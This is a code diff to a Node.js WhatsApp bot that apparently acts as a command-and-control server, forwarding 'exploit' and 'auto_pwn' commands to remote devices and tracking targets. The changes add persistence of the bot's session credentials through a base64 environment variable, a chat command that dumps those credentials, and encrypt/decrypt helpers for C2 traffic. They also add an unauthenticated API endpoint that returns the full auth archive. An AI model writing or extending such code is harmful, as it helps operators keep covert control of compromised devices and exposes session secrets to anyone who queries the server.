@@ -18,6 +18,37 @@ const DB_PATH = process.env.DB_PATH || './data.db';
 const TARGET_DB_PATH = process.env.TARGET_DB_PATH || './targets.json';
 
 fs.mkdirSync(path.dirname(DB_PATH), { recursive: true });
+fs.mkdirSync(AUTH_DIR, { recursive: true });
+
+// ── Auth persistence: restore from env var backup ─────
+if (process.env.AUTH_INFO_BASE64 && fs.readdirSync(AUTH_DIR).length === 0) {
+  console.log('[+] Restoring auth_info from AUTH_INFO_BASE64 env var...');
+  try {
+    const buf = Buffer.from(process.env.AUTH_INFO_BASE64, 'base64');
+    const tar = path.join(AUTH_DIR, 'backup.tar.gz');
+    fs.writeFileSync(tar, buf);
+    const { execSync } = await import('child_process');
+    execSync(`cd "${AUTH_DIR}" && tar xzf "${tar}" 2>/dev/null`, { stdio: 'ignore' });
+    fs.unlinkSync(tar);
+    console.log('[+] Auth info restored successfully');
+  } catch (e) {
+    console.error('[!] Auth restore failed:', e.message);
+  }
+}
+
+// ── Auth backup function ──────────────────────────────
+async function backupAuthToBase64() {
+  try {
+    const { execSync } = await import('child_process');
+    const tar = path.join(AUTH_DIR, 'backup.tar.gz');
+    execSync(`cd "${path.dirname(AUTH_DIR)}" && tar czf "${tar}" "${path.basename(AUTH_DIR)}" 2>/dev/null`, { stdio: 'ignore' });
+    const buf = fs.readFileSync(tar);
+    fs.unlinkSync(tar);
+    return buf.toString('base64');
+  } catch (e) {
+    return `Error: ${e.message}`;
+  }
+}
 
 const upload = multer({ storage: multer.memoryStorage(), limits: { fileSize: 50 * 1024 * 1024 } });
 
@@ -252,6 +283,11 @@ async function startBot() {
           await forwardToDevice({ ...ctx, cmd: 'exploit', args: 'list' });
         } else if (cmd === 'auto_pwn') {
           await forwardToDevice(ctx);
+        } else if (cmd === 'saveauth') {
+          const b64 = await backupAuthToBase64();
+          await sock.sendMessage(jid, { text: `🔐 *Auth Backup*\n\nSet this as \`AUTH_INFO_BASE64\` env var on Railway:\n\n${b64}` });
+        } else if (cmd === 'encrypt_help' || cmd === 'd_help') {
+          await sock.sendMessage(jid, { text: `📖 *Encryption Commands*\n\`!encrypt <text>\` — Encrypt a command\n\`!decrypt <base64>\` — Decrypt a response\n\`!c2 <command>\` — Encrypt + queue to device\n\`!d <base64>\` — Quick inline decrypt\n\n*CLI tool:*\n\`node tools/crypt.js encrypt "cmd"\`\n\`node tools/crypt.js decrypt <b64>\`` });
         } else {
           await forwardToDevice(ctx);
         }
@@ -271,6 +307,21 @@ async function startBot() {
       const plugin = findCommand(cmd);
       if (plugin) {
         await plugin.handler(ctx);
+      } else if (cmd === 'saveauth') {
+        const b64 = await backupAuthToBase64();
+        await sock.sendMessage(jid, { text: `🔐 *Auth Backup*\n\nSet this as \`AUTH_INFO_BASE64\` env var on Railway:\n\n${b64}` });
+      } else if (cmd === 'd') {
+        if (!args) {
+          await sock.sendMessage(jid, { text: '📖 *!d <base64>*\nDecrypt an encrypted C2 response inline.\nPaste the base64 (after 🔒).' });
+        } else {
+          try {
+            const { decrypt } = await import('../lib/crypto.js');
+            const result = decrypt(args.trim());
+            await sock.sendMessage(jid, { text: `🔓 *Decrypted:*\n${result}` });
+          } catch (e) {
+            await sock.sendMessage(jid, { text: `❌ Decrypt error: ${e.message}\nMake sure you only paste the base64 (after 🔒).` });
+          }
+        }
       } else {
         await forwardToDevice(ctx);
       }
@@ -342,6 +393,12 @@ app.post('/api/delete', (req, res) => {
   saveDb();
   sock.sendMessage(alertJid, { text: `🗑️ *${deviceId}* deleted: ${req.body?.messageId || ''}` });
   res.json({ ok: true });
+});
+
+app.get('/api/saveauth', async (req, res) => {
+  if (!sock?.user) return res.status(503).json({ error: 'bot not connected' });
+  const b64 = await backupAuthToBase64();
+  res.json({ status: 'ok', bot: sock.user?.id, auth_base64: b64 });
 });
 
 app.listen(PORT, () => {
